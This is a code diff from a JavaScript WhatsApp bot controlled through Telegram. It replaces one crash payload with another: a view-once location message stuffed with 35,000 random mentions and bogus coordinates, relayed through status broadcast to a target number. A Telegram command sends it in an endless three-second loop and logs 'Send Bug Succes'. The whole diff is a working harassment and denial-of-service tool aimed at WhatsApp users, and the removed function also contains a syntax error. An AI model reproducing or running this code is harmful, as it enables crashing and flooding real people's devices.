@@ -1060,97 +1060,70 @@ setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
 
 sendNext();
 };
-async function peler(target, mention) {
-    const mentionedList = [
-        "0@s.whatsapp.net",
-        ...Array.from({ length: 40000 }, () =>
-            `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)
-    ];
-    const imgUrl = "https://mmg.whatsapp.net/v/t62.7118-24/32712111_749506614240626_1571338893770400961_n.enc?ccb=11-4&oh=01_Q5Aa2AECrERdw8N4nXygP3uCGv3uqC3oRwhnDEuXWtdfVCUA4A&oe=68A29C7F&_nc_sid=5e03e0&mms3=true";
-    const mType = "image/jpeg";
-    const fileSha = "s0kIQLVw1FkyhgAvD8y+TRkXfPxkttdakdZKneu7Mro=";
-    const length = "285488";
-    const height = "1280";
-    const width = "763";
-    const mediakey = "QAplOD67eEe6b9w3TGM8oKXw2BbbydV4xRrKeZ1HC+I=";
-    const encSha = "yBs5l1vLoWUT3p/ZkpadRDL8Z2EnR91dsp/a/1z7Uuc=";
-    const partDirect = "/v/t62.7118-24/32712111_749506614240626_1571338893770400961_n.enc?ccb=11-4&oh=01_Q5Aa2AECrERdw8N4nXygP3uCGv3uqC3oRwhnDEuXWtdfVCUA4A&oe=68A29C7F&_nc_sid=5e03e0";
-    const keyTimestamp = "1752903565";
-
-    const imageMessage = {
-        url: imgUrl, 
-        mimetype: mType,
-        caption: "yong sarah",
-        fileSha256: fileSha,
-        fileLength: length,
-        height: height,
-        width: width,
-        mediaKey: mediakey,
-        fileEncSha256: encSha,
-        directPath: partDirect;
-        mediaKeyTimestamp: keyTimestamp,
-        jpegThumbnail: "",
-        contextInfo: {
-            mentionedJid: mentionedList,
-            forwardingScore: 999,
-            isForwarded: true,
-            entryPointConversionSource: "non_contact",
-            forwardingScore: 9999,
-            groupMentions: [],
-            forwardedNewsletterMessageInfo: {
-                newsletterJid: "120363321780343289@newsletter",
-                serverMessageId: 1000000,
-                newsletterName: "Go ahead and die ーフ"
-            }
-        }
+async function locxd(target) {
+  try {
+    let message = {
+      viewOnceMessage: {
+        message: {
+          locationMessage: {
+            name: "yong sarag",
+            address: "sarah",
+            comment: "sarah",
+            accuracyInMeters: 1,
+            degreesLatitude: 111.45231,
+            degreesLongitude: 111.45231,
+            contextInfo: {
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  {
+                    length: 35000,
+                  },
+                  () =>
+                    "628" +
+                    Math.floor(Math.random() * 10000000000) +
+                    "@s.whatsapp.net"
+                ),
+              ],
+              forwardingScore: 999999,
+              isForwarded: true,
+            },
+          },
+        },
+      },
     };
 
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: { imageMessage }
-        }
-    }, {});
+    const msg = generateWAMessageFromContent(target, message, {});
 
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
+    let statusid;
+    statusid = await sock.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
             {
-                tag: "meta",
-                attrs: {},
-                content: [
-                    {
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [
-                            { tag: "to", attrs: { jid: target }, content: undefined }
-                        ]
-                    }
-                ]
-            }
-        ]
-    });
-
-    if (mention) {
-        await sock.relayMessage(target, {
-            groupStatusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg.key,
-                        type: 25
-                    }
-                }
-            }
-        }, {
-            additionalNodes: [
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
                 {
-                    tag: "meta",
-                    attrs: { is_status_mention: "true" },
-                    content: undefined
-                }
-            ]
-        });
-    }
+                  tag: "to",
+                  attrs: { jid: target },
+                  content: undefined,
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    });
+  } catch (err) {
+    console.log(err);
+  }
 }
 async function VampireNewUi(target, Ptcp = true) {
   try {
@@ -2894,7 +2867,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
     });
 
     while (true) {
-        await peler(formatedNumber);
+        await locxd(formatedNumber);
         await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
